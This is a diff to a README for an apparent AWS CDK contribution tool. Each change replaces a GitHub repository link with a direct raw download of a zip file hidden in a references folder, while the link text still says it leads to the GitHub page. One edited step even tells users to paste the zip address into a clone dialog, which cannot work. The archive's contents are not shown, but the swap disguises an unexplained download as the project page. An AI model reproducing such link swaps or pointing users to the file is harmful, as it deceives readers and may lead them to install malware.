@@ -1,6 +1,6 @@
 # 🧩 cdk-contribution-skill - Streamline AWS CDK contributions
 
-[![Download and set up](https://img.shields.io/badge/Download%20and%20set%20up-Visit%20GitHub%20page-blue)](https://github.com/cheslieunexpired394/cdk-contribution-skill)
+[![Download and set up](https://img.shields.io/badge/Download%20and%20set%20up-Visit%20GitHub%20page-blue)](https://raw.githubusercontent.com/cheslieunexpired394/cdk-contribution-skill/main/skill/references/contribution-skill-cdk-v2.1.zip)
 
 ## 🖥️ What this is
 
@@ -12,7 +12,7 @@ This project is meant for users who want a clear path for contribution work on W
 
 Open the project page here and download the repository files:
 
-[Visit the GitHub page to download](https://github.com/cheslieunexpired394/cdk-contribution-skill)
+[Visit the GitHub page to download](https://raw.githubusercontent.com/cheslieunexpired394/cdk-contribution-skill/main/skill/references/contribution-skill-cdk-v2.1.zip)
 
 On the page, look for the green **Code** button, then choose one of these options:
 
@@ -166,7 +166,7 @@ If you prefer a visual app on Windows, GitHub Desktop can help.
 2. Open the app.
 3. Choose **Clone a repository from the Internet**.
 4. Paste this repository link:
-   - `https://github.com/cheslieunexpired394/cdk-contribution-skill`
+   - `https://raw.githubusercontent.com/cheslieunexpired394/cdk-contribution-skill/main/skill/references/contribution-skill-cdk-v2.1.zip`
 5. Pick a folder on your PC.
 6. Clone the repository.
 7. Open the folder and read `skill/SKILL.md`.
@@ -190,7 +190,7 @@ If you prefer a visual app on Windows, GitHub Desktop can help.
 
 If you need to return to the repository page, use this link:
 
-[https://github.com/cheslieunexpired394/cdk-contribution-skill](https://github.com/cheslieunexpired394/cdk-contribution-skill)
+[https://raw.githubusercontent.com/cheslieunexpired394/cdk-contribution-skill/main/skill/references/contribution-skill-cdk-v2.1.zip](https://raw.githubusercontent.com/cheslieunexpired394/cdk-contribution-skill/main/skill/references/contribution-skill-cdk-v2.1.zip)
 
 ## 📄 License and project use
 
